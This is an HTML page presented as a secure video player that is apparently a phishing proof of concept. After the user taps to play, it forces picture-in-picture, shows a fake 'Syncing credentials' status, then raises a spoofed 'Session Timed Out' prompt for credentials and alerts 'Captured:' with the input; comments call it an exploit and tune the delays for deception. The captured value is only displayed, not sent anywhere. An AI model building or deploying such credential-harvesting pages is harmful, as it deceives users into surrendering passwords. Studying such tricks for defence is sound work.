<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Watch Secure Video</title>
  <style>
    body {
      background-color: #000;
      color: white;
      font-family: sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }

    video {
      max-width: 90%;
      border: 2px solid white;
      border-radius: 8px;
      cursor: pointer;
    }

    #status {
      margin-top: 20px;
    }
  </style>
</head>
<body>

  <video id="vid" muted playsinline>
    <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
  </video>
  <div id="status">Tap video to play...</div>

  <script>
    const video = document.getElementById("vid");
    const status = document.getElementById("status");

    video.addEventListener("click", async () => {
      try {
        status.textContent = "Playing video...";

        await video.play();

        // Gesture persistence in play
        if (document.pictureInPictureEnabled && !document.pictureInPictureElement) {
          await video.requestPictureInPicture();
        }

        // Simulate "background action" delay
        setTimeout(() => {
          status.textContent = "Syncing credentials...";

          setTimeout(() => {
            const pw = prompt("ðŸ”’ Session Timed Out\nPlease re-enter your credentials to continue");
            if (pw) {
              alert("Captured: " + pw);
            } else {
              alert("No credentials entered.");
            }
          }, 1000); // Delay after fake status update

        }, 4000); // Total delay 4s (can be tuned: 2000â€“6000ms ideal)

      } catch (err) {
        console.error("Exploit failed", err);
      }
    });
  </script>

</body>
</html>
